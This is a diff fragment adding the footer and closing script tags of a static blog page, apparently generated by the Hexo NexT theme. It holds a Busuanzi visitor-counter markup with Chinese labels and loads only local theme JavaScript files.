+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
